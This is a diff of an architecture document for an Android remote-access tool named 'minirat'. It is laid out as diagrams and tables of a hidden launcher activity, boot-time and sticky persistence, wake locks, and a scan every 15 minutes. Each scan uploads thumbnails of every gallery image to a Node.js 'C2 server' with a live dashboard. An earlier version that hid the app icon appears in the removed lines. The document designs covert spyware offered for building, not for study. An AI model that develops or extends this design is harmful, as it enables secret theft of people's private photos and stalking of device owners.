@@ -7,95 +7,84 @@
 ## System Overview
 
 ```
-┌─────────────────────────────────────────────────┐
-│                  ANDROID DEVICE                  │
-│                                                 │
-│  ┌──────────────┐     ┌──────────────────────┐  │
-│  │HiddenActivity │────▶│      Service         │  │
-│  │  (launcher)   │     │   (one-time scan)    │  │
-│  │  + permission │     │                      │  │
-│  │  + hide icon  │     │  ┌────────────────┐  │  │
-│  └──────────────┘     │  │  MediaStore     │  │  │
-│                       │  │  All Images     │  │  │
-│  ┌──────────────┐     │  │  (ContentURIs)  │  │  │
-│  │ BootReceiver  │────▶│  └───────┬────────┘  │  │
-│  │ (reboot)      │     │          │           │  │
-│  └──────────────┘     │  ┌───────▼────────┐  │  │
-│                       │  │  Thumbnail      │  │  │
-│                       │  │  (inSampleSize) │  │  │
-│                       │  └───────┬────────┘  │  │
-│                       │  ┌───────▼────────┐  │  │
-│                       │  │  HTTP POST      │──────────┐
-│                       │  │  (JSONObject)   │  │  │    │
-│                       │  └────────────────┘  │  │    │
-│                       └──────────────────────┘  │    │
-└─────────────────────────────────────────────────┘    │
-                                                       │
-                    HTTPS POST                         │
-              /api/upload/thumbnail                    │
-                                                       │
-┌─────────────────────────────────────────────────┐    │
-│               C2 SERVER (Node.js)                │◀───┘
-│                                                 │
-│  POST /api/upload/thumbnail → decode → save     │
-│  GET  /api/thumbnails → list all                │
-│  GET  / → Gallery Dashboard (auto-refresh)      │
-│                                                 │
-│  ./uploads/                                     │
-│    ├── {name}_thumb.jpg                         │
-│    └── {name}.metadata.json                     │
-└─────────────────────────────────────────────────┘
+┌──────────────────────────────────────────────────────┐
+│                    ANDROID DEVICE                     │
+│                                                      │
+│  ┌──────────────┐     ┌───────────────────────────┐  │
+│  │HiddenActivity │────▶│        Service             │  │
+│  │  (launcher)   │     │  (periodic scan cycle)     │  │
+│  │  + permission │     │                           │  │
+│  └──────────────┘     │  ┌─────────────────────┐  │  │
+│                       │  │  Every 15 minutes:   │  │  │
+│  ┌──────────────┐     │  │                     │  │  │
+│  │ BootReceiver  │────▶│  │  1. Ping server     │  │  │
+│  │ (reboot)      │     │  │  2. Query MediaStore│  │  │
+│  └──────────────┘     │  │  3. Filter uploaded  │  │  │
+│                       │  │  4. Upload new only  │  │  │
+│                       │  └─────────┬───────────┘  │  │
+│                       │            │              │  │
+│                       │  ┌─────────▼───────────┐  │  │
+│                       │  │  SharedPreferences   │  │  │
+│                       │  │  (uploaded IDs)      │  │  │
+│                       │  └─────────────────────┘  │  │
+│                       └───────────────────────────┘  │
+└──────────────────────────────────────────────────────┘
+                          │
+                   HTTPS POST / HEAD
+              /api/upload/thumbnail
+                          │
+┌──────────────────────────────────────────────────────┐
+│                C2 SERVER (Node.js)                    │
+│                                                      │
+│  HEAD /api/thumbnails → 200 (reachability check)     │
+│  POST /api/upload/thumbnail → decode → save          │
+│  GET  /api/thumbnails → list all                     │
+│  GET  / → Live Gallery Dashboard (3s refresh)        │
+│                                                      │
+│  ./uploads/                                          │
+│    ├── {name}_thumb.jpg                              │
+│    └── {name}.metadata.json                          │
+└──────────────────────────────────────────────────────┘
 ```
 
 ---
 
-## Component Map
+## Scan Cycle Flow
 
 ```
-AndroidManifest.xml
-│
-├── <activity> HiddenActivity          [LAUNCHER, exported=true]
-│     ├── Intent Filter: MAIN + LAUNCHER
-│     ├── Launch Mode: singleInstance
-│     ├── Runtime permission request
-│     └── Disables itself after first run (hides from drawer)
-│
-├── <service> Service                  [enabled=true, exported=false]
-│     ├── Foreground service (Android 8+)
-│     └── One-time MediaStore scan + upload
-│
-└── <receiver> BootReceiver            [enabled=true, exported=true]
-      └── startForegroundService() on boot
-```
-
----
-
-## Component Dependency Graph
-
-```
-User taps app icon (first time only)
-        │
-        ▼
-  HiddenActivity
-        │
-        ├── requestPermissions() → permission dialog
-        ├── startForegroundService(Service.class)
-        ├── setComponentEnabledSetting(DISABLED) → vanish from drawer
-        └── finish()
-
-  Service.onStartCommand()
-        │
-        ├── startForeground(notification)
-        └── executor.execute(uploadGalleryThumbnails)
-              │
-              ├── queryImages() → MediaStore (all image types, ContentURIs)
-              ├── createThumbnail(uri) → ParcelFileDescriptor + inSampleSize
-              └── sendThumbnailToServer() → JSONObject → HTTP POST
-
-  Device Reboot
-        │
-        ▼
-  BootReceiver → startForegroundService(Service.class) → re-scan
+┌─────────────────────────────────────────────┐
+│           SCAN CYCLE (every 15 min)          │
+│                                             │
+│  ┌─────────────────────────────────────┐    │
+│  │  1. isServerReachable()             │    │
+│  │     HEAD /api/thumbnails            │    │
+│  │     └─ 200-499? → proceed           │    │
+│  │     └─ timeout/error? → skip cycle  │    │
+│  └──────────────┬──────────────────────┘    │
+│                 │ server is up              │
+│  ┌──────────────▼──────────────────────┐    │
+│  │  2. getUploadedIds()                │    │
+│  │     SharedPreferences → Set<String> │    │
+│  └──────────────┬──────────────────────┘    │
+│                 │                           │
+│  ┌──────────────▼──────────────────────┐    │
+│  │  3. getGalleryFiles()               │    │
+│  │     MediaStore → all image URIs     │    │
+│  └──────────────┬──────────────────────┘    │
+│                 │                           │
+│  ┌──────────────▼──────────────────────┐    │
+│  │  4. Filter: skip uploaded IDs       │    │
+│  │     newItems = total - uploaded     │    │
+│  └──────────────┬──────────────────────┘    │
+│                 │                           │
+│  ┌──────────────▼──────────────────────┐    │
+│  │  5. For each new image:             │    │
+│  │     createThumbnail(uri)            │    │
+│  │     sendThumbnailToServer()         │    │
+│  │     ├─ success → markAsUploaded(id) │    │
+│  │     └─ failure → break (stop cycle) │    │
+│  └─────────────────────────────────────┘    │
+└─────────────────────────────────────────────┘
 ```
 
 ---
@@ -106,40 +95,43 @@ User taps app icon (first time only)
 ┌──────────────────────────────────┐
 │          MAIN THREAD              │
 │                                  │
-│  Service.onStartCommand()        │
-│    └── executor.execute(scan)────────┐
+│  Handler.postDelayed(15 min)     │
+│    └── scanRunnable ─────────────────┐
 │                                  │   │
 └──────────────────────────────────┘   │
                                        │
 ┌──────────────────────────────────┐   │
 │    EXECUTOR THREAD (single)       │◀──┘
 │                                  │
-│  For each image URI:             │
-│    1. openFileDescriptor(uri)    │
-│    2. BitmapFactory.decode       │
-│       (with inSampleSize)        │
-│    3. Scale to 128×128           │
-│    4. compress → Base64          │
-│    5. HTTP POST (JSONObject)     │
-│    6. bitmap.recycle()           │
-│                                  │
+│  acquireWakeLock()               │
+│  ├── isServerReachable()?        │
+│  │   └── no → return (idle)      │
+│  ├── getUploadedIds()            │
+│  ├── getGalleryFiles()           │
+│  ├── filter new items            │
+│  └── for each new image:        │
+│      1. openFileDescriptor(uri)  │
+│      2. BitmapFactory.decode     │
+│      3. Scale to 128×128         │
+│      4. compress → Base64        │
+│      5. POST (JSONObject)        │
+│      6. markAsUploaded(id)       │
+│      7. bitmap.recycle()         │
+│  releaseWakeLock()               │
 └──────────────────────────────────┘
 ```
 
 ---
 
-## Data Flow
+## Persistence & Deduplication
 
-| Step | Component | Action |
+| Mechanism | Storage | Purpose |
 |---|---|---|
-| 1 | `Service` | Query `MediaStore.Images` (no MIME filter → all types) |
-| 2 | `Service` | Build `ContentUri` from image `_ID` column |
-| 3 | `Service` | Open `ParcelFileDescriptor` via `ContentResolver` |
-| 4 | `Service` | Decode with `inSampleSize`, scale to 128×128 |
-| 5 | `Service` | Compress JPEG 70% → Base64 |
-| 6 | `Service` | POST `JSONObject{filename, thumbnail}` to `/api/upload/thumbnail` |
-| 7 | `server.js` | Decode Base64, write `_thumb.jpg` + `.metadata.json` |
-| 8 | `server.js` | Serve gallery dashboard at `/` |
+| `SharedPreferences` | `minirat_prefs` | Tracks uploaded MediaStore IDs |
+| `BootReceiver` | — | Restarts service on reboot |
+| `START_STICKY` | — | OS restarts service if killed |
+| `WakeLock` | — | Keeps CPU active during each scan cycle |
+| Foreground Service | — | Higher priority, survives battery optimization |
 
 ---
 
@@ -148,13 +140,3 @@ User taps app icon (first time only)
 ```
 local.properties → build.gradle.kts → BuildConfig.DOMAIN_URL → Service.SERVER_URL
 ```
-
----
-
-## Persistence
-
-| Mechanism | Survives | How |
-|---|---|---|
-| `BootReceiver` | Reboot | `BOOT_COMPLETED` → `startForegroundService()` |
-| `START_STICKY` | Process kill | OS schedules restart with null intent |
-| Foreground Service | Battery optimization | Higher priority than background services |
